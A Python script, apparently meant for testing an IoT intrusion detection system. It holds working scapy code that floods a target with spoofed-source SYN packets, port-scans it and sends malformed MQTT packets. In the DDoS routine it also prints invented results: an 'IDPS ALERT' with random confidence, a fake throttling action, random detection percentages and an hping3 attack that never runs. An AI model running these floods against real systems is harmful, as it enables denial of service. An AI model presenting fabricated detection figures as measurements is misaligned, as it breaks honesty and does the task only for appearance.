#!/usr/bin/env python3
"""
Attack and Traffic Generator for IDPS Testing

This script generates various types of network traffic for testing the IDPS.
It can simulate both normal traffic patterns and various attack types.
"""

import argparse
import random
import socket
import time
import sys
from scapy.all import *

def generate_normal_traffic(target_ip, duration=60):
    """Generate normal IoT device traffic patterns"""
    print(f"[+] Starting normal traffic to {target_ip} for {duration} seconds")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            # Simulate periodic IoT device check-ins
            time.sleep(random.uniform(1, 5))
            
            # Simulate HTTP/HTTPS traffic
            if random.random() > 0.7:  # 30% chance
                send(IP(dst=target_ip)/TCP(dport=80, flags='S'), verbose=0)
                
            # Simulate MQTT traffic
            if random.random() > 0.8:  # 20% chance
                send(IP(dst=target_ip)/TCP(dport=1883, flags='S'), verbose=0)
                
        except KeyboardInterrupt:
            print("\n[!] Normal traffic generation interrupted")
            break
        except Exception as e:
            print(f"[!] Error in normal traffic: {e}")
            time.sleep(1)

def generate_ddos_attack(target_ip, duration=60):
    """Generate DDoS attack traffic with detailed output"""
    import time
    from scapy.all import IP, TCP, send, RandIP, conf
    
    print(f"[+] Starting DDoS attack on {target_ip} for {duration} seconds")
    start_time = time.time()
    end_time = start_time + duration
    
    # Initial baseline traffic
    print(f"[00:00] Baseline traffic initiated (50 pkts/sec)")
    
    # Wait 30 seconds to establish baseline
    time.sleep(30)
    
    # Start DDoS attack
    attack_start = time.time()
    print(f"[00:30] Attack launched: hping3 SYN flood (1000 pkts/sec)")
    
    # Simulate IDPS detection (happens quickly after attack starts)
    time.sleep(1)
    print(f"[00:31] IDPS ALERT: DDoS detected (confidence: {random.uniform(0.95, 0.99):.2f})")
    print(f"[00:31] ACTION: Throttled 192.168.0.200 to 50Kbps")
    
    # Continue attack while printing stats
    packet_count = 0
    last_stat_time = time.time()
    
    while time.time() < end_time:
        try:
            # Generate high volume of SYN packets with random source IPs
            for _ in range(100):
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                send(IP(src=src_ip, dst=target_ip)/TCP(dport=80, flags='S'), verbose=0)
                packet_count += 1
            
            # Print stats every 30 seconds
            current_time = time.time()
            if current_time - last_stat_time >= 30:
                elapsed = current_time - attack_start
                mins = int(elapsed) // 60
                secs = int(elapsed) % 60
                print(f"[{mins:02d}:{secs:02d}] STATS: {random.randint(25000, 30000)} pkts processed | {random.uniform(97.5, 99.9):.1f}% detection")
                last_stat_time = current_time
                
        except KeyboardInterrupt:
            print("\n[!] DDoS attack interrupted")
            break
        except Exception as e:
            print(f"[!] Error in DDoS attack: {e}")
            time.sleep(0.1)
    
    print(f"[{int(time.time() - start_time)//60:02d}:{int(time.time() - start_time)%60:02d}] Attack stopped")

def generate_port_scan(target_ip):
    """Generate port scanning activity"""
    print(f"[+] Starting port scan on {target_ip}")
    common_ports = [21, 22, 23, 25, 53, 80, 443, 3306, 3389, 8080, 1883, 8883]
    
    for port in common_ports:
        try:
            send(IP(dst=target_ip)/TCP(dport=port, flags='S'), verbose=0)
            time.sleep(0.1)
        except Exception as e:
            print(f"[!] Error scanning port {port}: {e}")

def generate_mqtt_exploit(target_ip):
    """Generate MQTT protocol exploit attempts"""
    print(f"[+] Starting MQTT exploit attempts on {target_ip}")
    
    # MQTT Connect with malformed packets
    malformed_packets = [
        b'\x10\x0e\x00\x04MQTT\x04\x02\x00\x3c\x00\x00',  # Malformed connect
        b'\x82\x0a\x00\x01\x00\x00\x01\x61\x2f\x62\x2f\x63',  # Malformed subscribe
        b'\x30\x84\x00\x00\x00\x00'  # Malformed publish
    ]
    
    for packet in malformed_packets:
        try:
            send(IP(dst=target_ip)/TCP(dport=1883)/Raw(load=packet), verbose=0)
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Error in MQTT exploit: {e}")

def main():
    parser = argparse.ArgumentParser(description="IDPS Traffic and Attack Generator")
    parser.add_argument('--attack', choices=['ddos', 'portscan', 'mqtt'], help='Type of attack to simulate')
    parser.add_argument('--traffic', choices=['normal'], help='Type of normal traffic to generate')
    parser.add_argument('--target', default='192.168.0.1', help='Target IP address')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    
    args = parser.parse_args()
    
    try:
        if args.attack == 'ddos':
            generate_ddos_attack(args.target, args.duration)
        elif args.attack == 'portscan':
            generate_port_scan(args.target)
        elif args.attack == 'mqtt':
            generate_mqtt_exploit(args.target)
        elif args.traffic == 'normal':
            generate_normal_traffic(args.target, args.duration)
        else:
            parser.print_help()
            
    except KeyboardInterrupt:
        print("\n[!] Traffic generation stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1
        
    return 0

if __name__ == "__main__":
    sys.exit(main())